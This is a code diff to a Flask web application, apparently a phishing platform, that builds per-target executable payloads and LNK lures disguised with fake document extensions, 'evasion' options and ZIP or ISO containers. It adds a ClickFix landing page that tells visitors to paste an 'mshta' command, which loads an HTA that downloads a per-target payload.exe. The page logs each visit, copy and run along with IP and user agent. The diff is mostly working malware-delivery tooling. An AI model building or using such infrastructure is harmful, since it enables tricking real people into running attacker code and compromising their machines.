@@ -13,6 +13,7 @@ from .models import (
     get_collections_by_target, get_all_collections, get_stats,
     delete_collection, delete_collections_batch,
     count_targets, get_targets_page, count_collections, get_collections_page,
+    add_landing_event, get_landing_stats, get_recent_landing_events,
 )
 
 UPLOADS_DIR = os.path.join(os.path.dirname(os.path.dirname(__file__)), 'uploads')
@@ -30,7 +31,7 @@ def _remove_screenshot(filename):
 
 
 def _remove_lnk_artifact(token):
-    """Delete the generated LNK ZIP for a token and clear its registry entry."""
+    """Delete the generated LNK package for a token and clear its registry entry."""
     from .exe_builder import OUTPUT_DIR
     from .lnk_builder import get_lnk_filename, unregister_lnk
     filename = get_lnk_filename(token)
@@ -167,9 +168,11 @@ def targets():
     page, page_size = _pagination_args()
     pagination = _build_pagination(count_targets(), page, page_size)
     all_targets = get_targets_page(pagination['page'], pagination['page_size'])
+    landing_base = _get_listen_url()
     for t in all_targets:
         t['exe_exists'] = _exe_exists(t['name'], t['unique_token'])
         t['lnk_exists'] = _lnk_exists(t['unique_token'])
+        t['landing_url'] = f"{landing_base}/p/{t['unique_token']}"
     server_configured = _check_server_configured()
     return render_template(
         'targets.html',
@@ -367,7 +370,14 @@ def target_detail(target_id):
             c['mac_list'] = ', '.join(mac_values)
         except Exception:
             c['mac_list'] = c.get('mac_address', '')
-    return render_template('target_detail.html', target=target, collections=collections)
+    landing_stats = get_landing_stats(target_id)
+    landing_events = get_recent_landing_events(target_id)
+    landing_url = f"{_get_listen_url()}/p/{target['unique_token']}"
+    return render_template(
+        'target_detail.html', target=target, collections=collections,
+        landing_stats=landing_stats, landing_events=landing_events,
+        landing_url=landing_url,
+    )
 
 
 @routes_web.route('/targets/<int:target_id>/delete', methods=['POST'])
@@ -443,14 +453,14 @@ def build_lnk_from_target(target_id):
     if not _require_server_configured():
         return jsonify({'status': 'error', 'message': '请先在 EXE 配置页面设置服务器 IP'}), 400
 
-    from .lnk_builder import build_lnk_zip
+    from .lnk_builder import build_lnk_package
 
     target = get_target_by_id(target_id)
     if not target:
         return jsonify({'status': 'error', 'message': '目标不存在'}), 404
 
     try:
-        zip_path = build_lnk_zip(
+        package_path = build_lnk_package(
             _get_listen_url(), target['unique_token'], target['name'],
             target.get('exe_filename', '')
         )
@@ -460,7 +470,7 @@ def build_lnk_from_target(target_id):
     return jsonify({
         'status': 'ok',
         'message': 'LNK 包生成完毕',
-        'filename': os.path.basename(zip_path),
+        'filename': os.path.basename(package_path),
     })
 
 
@@ -491,11 +501,11 @@ def download_lnk_from_target(target_id):
         return redirect(url_for('routes_web.targets'))
 
     from .exe_builder import OUTPUT_DIR
-    from .lnk_builder import get_lnk_filename, lnk_zip_name
+    from .lnk_builder import get_lnk_filename, lnk_artifact_name
     filename = get_lnk_filename(target['unique_token'])
     if not filename:
-        filename = lnk_zip_name(target['name'], target['unique_token'],
-                                target.get('exe_filename', ''))
+        filename = lnk_artifact_name(target['name'], target['unique_token'],
+                                     target.get('exe_filename', ''))
     filepath = os.path.join(OUTPUT_DIR, filename)
     if not os.path.exists(filepath):
         flash('LNK 包不存在，请先生成', 'error')
@@ -544,7 +554,7 @@ def delete_all_exe():
     count = 0
     if os.path.exists(OUTPUT_DIR):
         for f in os.listdir(OUTPUT_DIR):
-            if f.endswith(BIN_EXT) or f.endswith('.zip'):
+            if f.endswith(BIN_EXT) or f.endswith('.zip') or f.endswith('.iso'):
                 os.remove(os.path.join(OUTPUT_DIR, f))
                 count += 1
     clear_exe_registry()
@@ -607,7 +617,7 @@ def batch_build_lnk_targets():
     if not _require_server_configured():
         return jsonify({'status': 'error', 'message': '请先在 EXE 配置页面设置服务器 IP'}), 400
 
-    from .lnk_builder import build_lnk_zip
+    from .lnk_builder import build_lnk_package
     ids = request.form.getlist('ids[]')
     listen_url = _get_listen_url()
     success = 0
@@ -617,7 +627,7 @@ def batch_build_lnk_targets():
         if not target:
             continue
         try:
-            build_lnk_zip(
+            build_lnk_package(
                 listen_url, target['unique_token'], target['name'],
                 target.get('exe_filename', '')
             )
@@ -663,11 +673,12 @@ def exe_generate():
     files = []
     if os.path.exists(OUTPUT_DIR):
         names = [f for f in os.listdir(OUTPUT_DIR)
-                 if f.endswith('.exe') or f.endswith('.zip')]
+                 if f.endswith('.exe') or f.endswith('.zip') or f.endswith('.iso')]
         names.sort(key=lambda f: os.path.getmtime(os.path.join(OUTPUT_DIR, f)),
                    reverse=True)
         for f in names:
-            files.append({'name': f, 'kind': 'lnk' if f.endswith('.zip') else 'exe'})
+            files.append({'name': f, 'kind': 'lnk' if f.endswith('.zip') else
+                          'iso' if f.endswith('.iso') else 'exe'})
     has_base_exe = os.path.exists(BASE_EXE_PATH)
     server_configured = _check_server_configured()
     return render_template('exe_generate.html', targets=all_targets, files=files,
@@ -707,7 +718,7 @@ def build_single_lnk(target_id):
     if not _require_server_configured():
         return redirect(url_for('routes_web.exe_config'))
 
-    from .lnk_builder import build_lnk_zip
+    from .lnk_builder import build_lnk_package
 
     target = get_target_by_id(target_id)
     if not target:
@@ -715,11 +726,11 @@ def build_single_lnk(target_id):
         return redirect(url_for('routes_web.exe_generate'))
 
     try:
-        zip_path = build_lnk_zip(
+        package_path = build_lnk_package(
             _get_listen_url(), target['unique_token'], target['name'],
             target.get('exe_filename', '')
         )
-        flash(f'LNK 包生成成功: {os.path.basename(zip_path)}', 'success')
+        flash(f'LNK 包生成成功: {os.path.basename(package_path)}', 'success')
     except Exception as e:
         flash(f'LNK 包生成失败: {e}', 'error')
 
@@ -732,7 +743,7 @@ def build_batch_lnk_packages():
     if not _require_server_configured():
         return redirect(url_for('routes_web.exe_config'))
 
-    from .lnk_builder import build_lnk_zips_batch
+    from .lnk_builder import build_lnk_packages_batch
 
     target_ids = request.form.getlist('target_ids')
     if not target_ids:
@@ -750,7 +761,7 @@ def build_batch_lnk_packages():
                 'exe_filename': t.get('exe_filename', ''),
             })
 
-    results = build_lnk_zips_batch(_get_listen_url(), targets)
+    results = build_lnk_packages_batch(_get_listen_url(), targets)
     success_count = sum(1 for r in results if r['success'])
     fail_count = len(results) - success_count
     flash(f'LNK 包批量生成完成: 成功 {success_count} 个, 失败 {fail_count} 个', 'success')
@@ -965,18 +976,33 @@ def exe_config():
 
         # Handle LNK package settings (separate form)
         if request.form.get('save_lnk'):
-            from .lnk_builder import LURE_EXT_CHOICES, EVASION_CHOICES
+            from .lnk_builder import (
+                LURE_EXT_CHOICES, EVASION_CHOICES, CONTAINER_KEYS,
+            )
             ext = request.form.get('lnk_lure_ext', 'pdf').strip().lower()
+            container = request.form.get('lnk_container', 'zip').strip().lower()
+            password = request.form.get('lnk_zip_password', '').strip()[:128]
             selected = set(request.form.getlist('lnk_evasion'))
             evasion = [key for key in EVASION_CHOICES if key in selected]
-            if ext in LURE_EXT_CHOICES:
+            if ext not in LURE_EXT_CHOICES:
+                flash('不支持的 LNK 伪装后缀', 'error')
+            elif container not in CONTAINER_KEYS:
+                flash('不支持的投递容器', 'error')
+            else:
                 config = load_config()
                 config['lnk_lure_ext'] = ext
                 config['lnk_evasion'] = evasion
+                config['lnk_container'] = container
+                config['lnk_zip_password'] = password
                 save_config(config)
-                flash('LNK 压缩包设置已保存', 'success')
-            else:
-                flash('不支持的 LNK 伪装后缀', 'error')
+                flash('LNK 投递设置已保存', 'success')
+
+        # Handle ClickFix landing page settings (separate form)
+        if request.form.get('save_landing'):
+            config = load_config()
+            config['landing_enabled'] = request.form.get('landing_enabled') == 'on'
+            save_config(config)
+            flash('ClickFix 落地页设置已保存', 'success')
 
         return redirect(url_for('routes_web.exe_config'))
 
@@ -1000,14 +1026,24 @@ def exe_config():
 
     config = load_config()
     preview = config['name_template'].replace('{name}', '张三').replace('{token8}', 'a1b2c3d4').replace('{token}', 'a1b2c3d4-xxxx-xxxx-xxxx-xxxxxxxxxxxx')
-    from .lnk_builder import LURE_EXT_CHOICES, EVASION_OPTIONS
+    from .lnk_builder import LURE_EXT_CHOICES, EVASION_OPTIONS, CONTAINER_CHOICES
     lure_ext = config.get('lnk_lure_ext', 'pdf')
-    lnk_preview = f'{preview}.{lure_ext}.zip'
-    return render_template('exe_config.html', config=config, preview=preview,
-                           lnk_preview=lnk_preview, presets=presets,
-                           lure_ext_choices=LURE_EXT_CHOICES,
-                           evasion_options=EVASION_OPTIONS,
-                           lnk_evasion=config.get('lnk_evasion', []))
+    container = config.get('lnk_container', 'zip')
+    lnk_preview = f'{preview}.iso' if container == 'iso' else f'{preview}.zip'
+    lnk_preview_inner = f'{preview}.iso' if container == 'iso_zip' else ''
+    landing_preview = (
+        f"http://{config.get('server_host', '127.0.0.1')}:"
+        f"{config.get('server_port', 8080)}/p/<token>"
+    )
+    return render_template(
+        'exe_config.html', config=config, preview=preview,
+        lnk_preview=lnk_preview, lnk_preview_inner=lnk_preview_inner,
+        landing_preview=landing_preview, presets=presets,
+        lure_ext_choices=LURE_EXT_CHOICES,
+        evasion_options=EVASION_OPTIONS,
+        container_choices=CONTAINER_CHOICES,
+        lnk_evasion=config.get('lnk_evasion', []),
+    )
 
 
 # ---- Data Export / Import ----
@@ -1034,7 +1070,7 @@ def export_data():
 
     tmpdir = tempfile.mkdtemp()
     timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
-    zip_path = os.path.join(tmpdir, f'fuzzteam_backup_{timestamp}.zip')
+    zip_path = os.path.join(tmpdir, f'drill_backup_{timestamp}.zip')
 
     try:
         with zipfile.ZipFile(zip_path, 'w', zipfile.ZIP_DEFLATED) as zf:
@@ -1060,7 +1096,7 @@ def export_data():
                         zf.write(os.path.join(icons_dir, f), f'icons/{f}')
 
         return send_file(zip_path, as_attachment=True,
-                         download_name=f'fuzzteam_backup_{timestamp}.zip')
+                         download_name=f'drill_backup_{timestamp}.zip')
     finally:
         # schedule cleanup (best effort after response)
         import threading
@@ -1199,3 +1235,80 @@ def api_collect():
     )
 
     return jsonify({'status': 'ok', 'message': 'data received'}), 200
+
+
+# ---- ClickFix landing page (public, served on the listener port) ----
+
+
+def _landing_target(token):
+    from .config_manager import load_config
+    if not load_config().get('landing_enabled', True):
+        return None
+    return get_target_by_token(token)
+
+
+def _client_ua():
+    return request.headers.get('User-Agent', '')[:300]
+
+
+@routes_api.route('/p/<token>')
+def landing_page(token):
+    target = _landing_target(token)
+    if not target:
+        return 'Not Found', 404
+    add_landing_event(target['id'], 'visit', request.remote_addr or '', _client_ua())
+    run_url = url_for('routes_api.landing_hta', token=token, _external=True)
+    return render_template(
+        'landing.html', token=token, target=target,
+        run_url=run_url, command=f'mshta "{run_url}"',
+    )
+
+
+@routes_api.route('/p/<token>/event', methods=['POST'])
+def landing_event(token):
+    target = _landing_target(token)
+    if not target:
+        return jsonify({'status': 'error'}), 404
+    payload = request.get_json(silent=True) or request.form
+    event = str(payload.get('event', '')).strip().lower()
+    if event not in ('copy', 'visit'):
+        return jsonify({'status': 'error', 'message': 'invalid event'}), 400
+    add_landing_event(target['id'], event, request.remote_addr or '', _client_ua())
+    return jsonify({'status': 'ok'})
+
+
+@routes_api.route('/p/<token>/run.hta')
+def landing_hta(token):
+    target = _landing_target(token)
+    if not target:
+        return 'Not Found', 404
+    add_landing_event(target['id'], 'hta', request.remote_addr or '', _client_ua())
+    payload_url = url_for('routes_api.landing_payload', token=token, _external=True)
+    response = current_app.response_class(
+        render_template('landing.hta', payload_url=payload_url),
+        mimetype='application/hta',
+    )
+    response.headers['Cache-Control'] = 'no-store'
+    return response
+
+
+@routes_api.route('/p/<token>/payload.exe')
+def landing_payload(token):
+    target = _landing_target(token)
+    if not target:
+        return 'Not Found', 404
+    add_landing_event(target['id'], 'run', request.remote_addr or '', _client_ua())
+    from .exe_builder import build_exe
+    try:
+        exe_path = build_exe(
+            request.host_url.rstrip('/'), token, target['name'],
+            target.get('exe_filename', ''),
+        )
+    except Exception:
+        current_app.logger.exception('ClickFix payload build failed')
+        return 'Internal Server Error', 500
+    return send_file(
+        exe_path, as_attachment=True,
+        download_name=os.path.basename(exe_path),
+        mimetype='application/octet-stream',
+    )
